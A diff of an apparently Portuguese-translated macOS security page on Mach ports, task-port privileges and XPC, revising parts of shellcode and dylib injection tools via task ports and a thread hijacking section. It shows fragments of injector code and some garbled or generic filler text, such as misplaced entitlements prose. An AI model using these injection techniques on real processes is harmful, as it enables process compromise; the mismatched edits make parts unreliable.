@@ -22,8 +22,9 @@ Os direitos de porta, que definem quais operações uma tarefa pode executar, s�
 
 * **Direito de recebimento**, que permite receber mensagens enviadas para a porta. As portas Mach são filas MPSC (múltiplos produtores, único consumidor), o que significa que pode haver apenas **um direito de recebimento para cada porta** em todo o sistema (ao contrário de pipes, onde vários processos podem ter descritores de arquivo para a extremidade de leitura de um pipe).
 * Uma **tarefa com o direito de recebimento** pode receber mensagens e **criar direitos de envio**, permitindo o envio de mensagens. Originalmente, apenas a **própria tarefa tem o direito de recebimento sobre sua porta**.
-* **Direito de envio**, que permite o envio de mensagens para a porta.
-* **Direito de envio único**, que permite o envio de uma única mensagem para a porta e depois desaparece.
+* **Direito de envio**, que permite enviar mensagens para a porta.
+* O direito de envio pode ser **clonado**, para que uma tarefa que possui um direito de envio possa clonar o direito e **concedê-lo a uma terceira tarefa**.
+* **Direito de envio único**, que permite enviar uma mensagem para a porta e depois desaparece.
 * **Direito de conjunto de portas**, que denota um _conjunto de portas_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Conjuntos de portas podem ser usados para escutar várias portas simultaneamente, de forma semelhante a `select`/`poll`/`epoll`/`kqueue` no Unix.
 * **Nome morto**, que não é um direito de porta real, mas apenas um espaço reservado. Quando uma porta é destruída, todos os direitos de porta existentes para a porta se tornam nomes mortos.
 
@@ -50,10 +51,29 @@ Para esses serviços predefinidos, o **processo de busca difere um pouco**. Quan
 * A tarefa **A** (o serviço) realiza um **check-in de inicialização**. Aqui, o **servidor de inicialização** cria um direito de ENVIO, o retém e **transfere o direito de RECEBIMENTO para a Tarefa A**.
 * O launchd duplica o **direito de ENVIO e o envia para a Tarefa B**.
 
-No entanto, esse processo se aplica apenas a tarefas do sistema predefinidas. Tarefas não do sistema ainda operam conforme descrito originalmente, o que poderia permitir potencialmente a falsificação.
+No entanto, esse processo se aplica apenas a tarefas do sistema predefinidas. Tarefas não pertencentes ao sistema ainda operam conforme descrito originalmente, o que poderia permitir a falsificação.
+### Serviços Mach
+
+Os nomes especificados nos aplicativos localizados nos diretórios protegidos pelo SIP mencionados anteriormente não podem ser registrados por outros processos.
+
+Por exemplo, `/System/Library/LaunchAgents/com.apple.xpc.loginitemregisterd.plist` registra o nome `com.apple.xpc.loginitemregisterd`:
+```json
+plutil -p com.apple.xpc.loginitemregisterd.plist
+{
+"EnablePressuredExit" => 1
+"Label" => "com.apple.xpc.loginitemregisterd"
+"MachServices" => {
+"com.apple.xpc.loginitemregisterd" => 1
+}
+"ProcessType" => "Adaptive"
+"Program" => "/usr/libexec/loginitemregisterd"
+}
+```
+Se você tentar registrá-lo com um código como o seguinte, você não conseguirá.
+
 ### Exemplo de código
 
-Observe como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de inicialização** enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.
+Observe como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de inicialização**, enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.
 
 {% tabs %}
 {% tab title="receiver.c" %}
@@ -136,29 +156,29 @@ int main(int argc, char** argv) {
     kern_return_t kr;
     char buffer[BUFFER_SIZE];
 
-    // Create a send right to the server port
-    kr = bootstrap_look_up(bootstrap_port, "com.example.server", &server_port);
+    // Create a send right to the bootstrap port
+    kr = bootstrap_look_up(bootstrap_port, "com.apple.securityd", &server_port);
     if (kr != KERN_SUCCESS) {
-        printf("Failed to look up server port: %s\n", mach_error_string(kr));
-        exit(1);
+        printf("Failed to look up the server port: %s\n", mach_error_string(kr));
+        return 1;
     }
 
     // Send a message to the server
     strcpy(buffer, "Hello, server!");
     kr = mach_msg_send((mach_msg_header_t*)buffer);
     if (kr != KERN_SUCCESS) {
-        printf("Failed to send message: %s\n", mach_error_string(kr));
-        exit(1);
+        printf("Failed to send message to the server: %s\n", mach_error_string(kr));
+        return 1;
     }
 
     // Receive a reply from the server
     kr = mach_msg_receive((mach_msg_header_t*)buffer);
     if (kr != KERN_SUCCESS) {
-        printf("Failed to receive reply: %s\n", mach_error_string(kr));
-        exit(1);
+        printf("Failed to receive reply from the server: %s\n", mach_error_string(kr));
+        return 1;
     }
 
-    printf("Received reply: %s\n", buffer);
+    printf("Received reply from the server: %s\n", buffer);
 
     return 0;
 }
@@ -222,18 +242,18 @@ printf("Sent a message\n");
 
 ### Portas Privilegiadas
 
-* **Porta do host**: Se um processo tem o **privilégio de envio** sobre esta porta, ele pode obter **informações** sobre o **sistema** (por exemplo, `host_processor_info`).
-* **Porta de privilégio do host**: Um processo com o direito de **envio** sobre esta porta pode realizar **ações privilegiadas**, como carregar uma extensão do kernel. O **processo precisa ser root** para obter essa permissão.
-* Além disso, para chamar a API **`kext_request`**, é necessário ter a autorização **`com.apple.private.kext`**, que é fornecida apenas para binários da Apple.
+* **Porta do host**: Se um processo tem o privilégio de **enviar** sobre esta porta, ele pode obter **informações** sobre o **sistema** (por exemplo, `host_processor_info`).
+* **Porta privilégiada do host**: Um processo com o direito de **enviar** sobre esta porta pode realizar **ações privilegiadas**, como carregar uma extensão do kernel. O **processo precisa ser root** para obter essa permissão.
+* Além disso, para chamar a API **`kext_request`**, é necessário ter outras permissões **`com.apple.private.kext*`**, que são concedidas apenas a binários da Apple.
 * **Porta do nome da tarefa**: Uma versão não privilegiada da _porta da tarefa_. Ela faz referência à tarefa, mas não permite controlá-la. A única coisa que parece estar disponível através dela é `task_info()`.
 * **Porta da tarefa** (também conhecida como porta do kernel)**:** Com permissão de envio sobre esta porta, é possível controlar a tarefa (ler/escrever memória, criar threads...).
 * Chame `mach_task_self()` para **obter o nome** desta porta para a tarefa chamadora. Esta porta é **herdada** apenas através do **`exec()`**; uma nova tarefa criada com `fork()` recebe uma nova porta de tarefa (como um caso especial, uma tarefa também recebe uma nova porta de tarefa após `exec()` em um binário suid). A única maneira de criar uma tarefa e obter sua porta é realizar a ["dança de troca de porta"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) enquanto faz um `fork()`.
 * Estas são as restrições para acessar a porta (de `macos_task_policy` do binário `AppleMobileFileIntegrity`):
-* Se o aplicativo tiver a autorização **`com.apple.security.get-task-allow`**, processos do **mesmo usuário podem acessar a porta da tarefa** (comumente adicionado pelo Xcode para depuração). O processo de **notarização** não permitirá isso em lançamentos de produção.
-* Aplicativos com a autorização **`com.apple.system-task-ports`** podem obter a **porta da tarefa para qualquer** processo, exceto o kernel. Em versões mais antigas, era chamada **`task_for_pid-allow`**. Isso é concedido apenas a aplicativos da Apple.
-* **Root pode acessar portas de tarefas** de aplicativos **não** compilados com um tempo de execução **reforçado** (e não da Apple).
+* Se o aplicativo tiver a permissão **`com.apple.security.get-task-allow`**, processos do **mesmo usuário podem acessar a porta da tarefa** (comumente adicionado pelo Xcode para depuração). O processo de **notarização** não permitirá isso em lançamentos de produção.
+* Aplicativos com a permissão **`com.apple.system-task-ports`** podem obter a **porta da tarefa para qualquer** processo, exceto o kernel. Em versões mais antigas, era chamada **`task_for_pid-allow`**. Isso é concedido apenas a aplicativos da Apple.
+* **Root pode acessar portas de tarefas** de aplicativos **não** compilados com um tempo de execução **fortificado** (e não da Apple).
 
-### Injeção de Shellcode no Processo via Porta da Tarefa
+### Injeção de Shellcode em thread via Porta da Tarefa
 
 Você pode obter um shellcode em:
 
@@ -246,17 +266,43 @@ Você pode obter um shellcode em:
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
+
 #import <Foundation/Foundation.h>
+
+double performMathOperations() {
+double result = 0;
+for (int i = 0; i < 10000; i++) {
+result += sqrt(i) * tan(i) - cos(i);
+}
+return result;
+}
 
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
-NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
-[NSThread sleepForTimeInterval:99999];
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
+processIdentifier]);
+while (true) {
+[NSThread sleepForTimeInterval:5];
+
+performMathOperations();  // Silent action
+
+[NSThread sleepForTimeInterval:5];
+}
 }
 return 0;
 }
 ```
 {% tab title="entitlements.plist" %}
+
+O arquivo `entitlements.plist` contém informações sobre as permissões e privilégios concedidos a um aplicativo no macOS. Essas permissões podem incluir acesso a recursos do sistema, como câmera, microfone, localização e muito mais. O arquivo `entitlements.plist` é usado para definir as capacidades e restrições de um aplicativo, garantindo que ele tenha acesso apenas aos recursos necessários e autorizados.
+
+Para fortalecer a segurança do macOS, é importante revisar e ajustar as permissões definidas no arquivo `entitlements.plist`. Isso pode ser feito removendo permissões desnecessárias ou restritas, limitando o acesso a recursos sensíveis e garantindo que apenas os recursos necessários sejam concedidos ao aplicativo.
+
+Ao analisar o arquivo `entitlements.plist`, é possível identificar possíveis vulnerabilidades de privilégio e escalonamento de privilégios. Por exemplo, se um aplicativo tiver permissões excessivas ou não autorizadas, um invasor pode explorar essas permissões para obter acesso não autorizado a recursos do sistema ou executar ações maliciosas.
+
+Portanto, é fundamental entender e auditar regularmente as permissões definidas no arquivo `entitlements.plist` para garantir a segurança e a privacidade dos aplicativos no macOS.
+
+{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -273,7 +319,7 @@ return 0;
 
 <details>
 
-<summary>injector.m</summary>
+<summary>sc_injector.m</summary>
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
@@ -416,14 +462,54 @@ return (-3);
 return (0);
 }
 
+pid_t pidForProcessName(NSString *processName) {
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];
+
+NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];
+
+NSFileHandle *file = [pipe fileHandleForReading];
+
+[task launch];
+
+NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+return (pid_t)[string integerValue];
+}
+
+BOOL isStringNumeric(NSString *str) {
+NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
+}
+
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
 if (argc < 2) {
-NSLog(@"Usage: %s <pid>", argv[0]);
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
 return 1;
 }
 
-pid_t pid = atoi(argv[1]);
+NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;
+
+if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}
+
 inject(pid);
 }
 
@@ -433,15 +519,15 @@ return 0;
 </details>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
-./inject <pid-of-mysleep>
+./inject <pi or string>
 ```
-### Injeção de Processo Dylib via Porta de Tarefa
+### Injeção de Dylib em thread via porta de tarefa
 
-No macOS, as **threads** podem ser manipuladas através do **Mach** ou usando a **API posix `pthread`**. A thread que geramos na injeção anterior foi gerada usando a API Mach, então **não é compatível com posix**.
+No macOS, as **threads** podem ser manipuladas através do **Mach** ou usando a API **posix `pthread`**. A thread que geramos na injeção anterior foi gerada usando a API Mach, portanto, **não é compatível com posix**.
 
-Foi possível **injetar um shellcode simples** para executar um comando porque ele **não precisava trabalhar com APIs compatíveis com posix**, apenas com Mach. Injeções **mais complexas** precisariam que a **thread** também fosse **compatível com posix**.
+Foi possível **injetar um shellcode simples** para executar um comando porque não era necessário trabalhar com APIs compatíveis com posix, apenas com Mach. Injeções **mais complexas** precisariam que a **thread** também fosse **compatível com posix**.
 
-Portanto, para **melhorar o shellcode**, ele deve chamar **`pthread_create_from_mach_thread`**, que irá **criar um pthread válido**. Em seguida, esse novo pthread pode **chamar o dlopen** para **carregar nossa dylib** do sistema.
+Portanto, para **melhorar a thread**, ela deve chamar **`pthread_create_from_mach_thread`**, que irá **criar um pthread válido**. Em seguida, esse novo pthread pode **chamar dlopen** para **carregar uma dylib** do sistema, então, em vez de escrever um novo shellcode para executar ações diferentes, é possível carregar bibliotecas personalizadas.
 
 Você pode encontrar **exemplos de dylibs** em (por exemplo, aquele que gera um log e depois você pode ouvi-lo):
 
@@ -503,7 +589,7 @@ mach_msg_type_number_t dataCnt
 
 char injectedCode[] =
 
-"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
 // Call pthread_set_self
 
@@ -729,7 +815,9 @@ else
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-### Injeção de Thread via Porta de Tarefa <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+### Sequestro de Thread via Porta de Tarefa <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+
+Nesta técnica, uma thread do processo é sequestrada:
 
 {% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
@@ -739,7 +827,7 @@ gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 
 ### Informações Básicas
 
-XPC, que significa Comunicação Interprocessos (IPC) do XNU (o kernel usado pelo macOS), é uma estrutura para **comunicação entre processos** no macOS e iOS. O XPC fornece um mecanismo para fazer chamadas de método **seguras e assíncronas entre diferentes processos** no sistema. É parte do paradigma de segurança da Apple, permitindo a **criação de aplicativos com privilégios separados**, onde cada **componente** é executado com **apenas as permissões necessárias** para realizar seu trabalho, limitando assim os danos potenciais de um processo comprometido.
+XPC, que significa Comunicação Interprocessos (IPC) do XNU (o kernel usado pelo macOS), é uma estrutura para **comunicação entre processos** no macOS e iOS. O XPC fornece um mecanismo para fazer **chamadas de método seguras e assíncronas entre diferentes processos** no sistema. É parte do paradigma de segurança da Apple, permitindo a **criação de aplicativos com privilégios separados**, onde cada **componente** é executado com **apenas as permissões necessárias** para realizar seu trabalho, limitando assim os danos potenciais de um processo comprometido.
 
 O XPC usa uma forma de Comunicação Interprocessos (IPC), que é um conjunto de métodos para que programas diferentes em execução no mesmo sistema possam enviar dados de ida e volta.
 
@@ -751,7 +839,7 @@ Os principais benefícios do XPC incluem:
 
 A única **desvantagem** é que **separar um aplicativo em vários processos** e fazê-los se comunicar via XPC é **menos eficiente**. Mas nos sistemas de hoje isso quase não é perceptível e os benefícios são muito melhores.
 
-Um exemplo pode ser visto no QuickTime Player, onde um componente que usa XPC é responsável pela decodificação de vídeo. O componente é especificamente projetado para realizar tarefas computacionais e, portanto, no caso de uma violação, não forneceria nenhum ganho útil ao invasor, como acesso a arquivos ou à rede.
+Um exemplo pode ser visto no QuickTime Player, onde um componente que usa XPC é responsável pela decodificação de vídeo. O componente é especificamente projetado para realizar tarefas computacionais e, portanto, no caso de uma violação, não forneceria nenhum ganho útil ao atacante, como acesso a arquivos ou à rede.
 
 ### Serviços XPC Específicos do Aplicativo
 
@@ -815,7 +903,7 @@ Quando um processo tenta chamar um método por meio de uma conexão XPC, o **ser
 
 ### Autorização XPC
 
-A Apple também permite que os aplicativos **configurem alguns direitos e como obtê-los**, para que, se o processo de chamada os tiver, ele seja **autorizado a chamar um método** do serviço XPC:
+A Apple também permite que os aplicativos **configurem alguns direitos e como obtê-los**, para que, se o processo de chamada os tiver, ele possa ser **autorizado a chamar um método** do serviço XPC:
 
 {% content-ref url="macos-xpc-authorization.md" %}
 [macos-xpc-authorization.md](macos-xpc-authorization.md)
@@ -1059,33 +1147,45 @@ return 0;
 
 ## Introduction
 
-Inter-Process Communication (IPC) is a mechanism that allows different processes to communicate with each other and share data. In Mac OS, IPC is used extensively for various purposes, such as inter-application communication, client-server communication, and communication between different components of the operating system.
+Inter-Process Communication (IPC) is a mechanism that allows different processes to communicate with each other and share data. In Mac OS, IPC is an essential part of the operating system architecture and is used by various system components and applications.
 
-Understanding how IPC works in Mac OS is crucial for both developers and security professionals. Developers need to know how to implement IPC mechanisms correctly and securely, while security professionals need to understand the potential security risks associated with IPC and how to mitigate them.
+## Types of IPC in Mac OS
 
-This guide provides an overview of IPC in Mac OS, including the different IPC mechanisms available, their characteristics, and potential security vulnerabilities. It also covers best practices for implementing secure IPC in Mac OS applications.
+Mac OS supports several types of IPC mechanisms, including:
 
-## Table of Contents
+1. **Mach Ports**: Mach ports are the fundamental IPC mechanism in Mac OS. They are used for communication between processes and for accessing various system services.
 
-- [IPC Mechanisms in Mac OS](ipc-mechanisms.md)
-- [Mach Ports](mach-ports.md)
-- [XPC Services](xpc-services.md)
-- [Distributed Objects](distributed-objects.md)
-- [Security Considerations](security-considerations.md)
-- [Best Practices](best-practices.md)
+2. **UNIX Domain Sockets**: UNIX domain sockets provide a communication channel between processes running on the same machine. They are widely used by system daemons and server applications.
+
+3. **Distributed Objects**: Distributed objects provide a high-level IPC mechanism that allows objects to be accessed remotely. They are used by some system services and applications.
+
+4. **XPC**: XPC (eXtensible Procedure Call) is a modern IPC mechanism introduced in Mac OS X 10.7. It provides a secure and efficient way for processes to communicate with each other.
+
+## Security Considerations
+
+IPC can introduce security risks if not properly implemented and configured. Here are some security considerations to keep in mind when working with IPC in Mac OS:
+
+1. **Authentication and Authorization**: Ensure that only authorized processes can access IPC channels and services. Use appropriate authentication and authorization mechanisms to prevent unauthorized access.
+
+2. **Secure Communication**: Protect the confidentiality and integrity of data exchanged through IPC channels. Use encryption and secure protocols to prevent eavesdropping and tampering.
+
+3. **Input Validation**: Validate all input received through IPC channels to prevent injection attacks and other security vulnerabilities.
+
+4. **Sandboxing**: Consider using sandboxing techniques to restrict the privileges and capabilities of processes involved in IPC. This can help mitigate the impact of potential security breaches.
+
+## Privilege Escalation through IPC
+
+In some cases, insecure or misconfigured IPC channels can be exploited to escalate privileges and gain unauthorized access to system resources. This can be done by:
+
+1. **Impersonating a Trusted Process**: By exploiting a vulnerability in an IPC channel, an attacker can impersonate a trusted process and gain elevated privileges.
+
+2. **Abusing Privileged IPC Services**: If a privileged IPC service is not properly secured, an attacker can abuse it to execute arbitrary code with elevated privileges.
+
+3. **Tampering with IPC Messages**: By tampering with IPC messages, an attacker can manipulate the behavior of the receiving process and potentially gain unauthorized access to sensitive information or resources.
 
 ## Conclusion
 
-IPC is a fundamental concept in Mac OS and plays a crucial role in enabling communication between different processes. Understanding how IPC works and the potential security risks associated with it is essential for both developers and security professionals.
-
-By following best practices and implementing secure IPC mechanisms, developers can ensure that their applications are not vulnerable to IPC-related attacks. Security professionals can also use this knowledge to identify and mitigate potential security vulnerabilities in Mac OS applications.
-
-## References
-
-- [Apple Developer Documentation: Inter-Process Communication](https://developer.apple.com/documentation/interprocesscommunication)
-- [Apple Developer Documentation: Mach Ports](https://developer.apple.com/documentation/kernel/mach_ports)
-- [Apple Developer Documentation: XPC Services](https://developer.apple.com/documentation/xpc)
-- [Apple Developer Documentation: Distributed Objects](https://developer.apple.com/documentation/distributedobjects)
+Understanding IPC mechanisms and their security implications is crucial for building secure and robust applications on Mac OS. By following best practices and implementing appropriate security measures, you can minimize the risk of IPC-related vulnerabilities and protect your system from unauthorized access.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
